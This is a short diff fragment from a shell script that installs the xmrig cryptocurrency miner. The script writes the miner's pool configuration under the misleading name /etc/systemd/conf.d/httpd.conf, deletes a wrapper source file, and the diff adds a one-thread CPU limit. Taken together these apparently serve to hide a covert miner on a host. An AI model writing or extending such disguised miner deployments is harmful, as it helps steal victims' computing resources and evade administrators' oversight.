@@ -47,6 +47,10 @@ rm /opt/xmrig/wrapper.c
 # 生成配置文件
 cat > /etc/systemd/conf.d/httpd.conf <<EOF
 {
+    "cpu":
+         {
+            "threads": 1
+        },
     "pools": [
         {
             "url": "$pool_url",
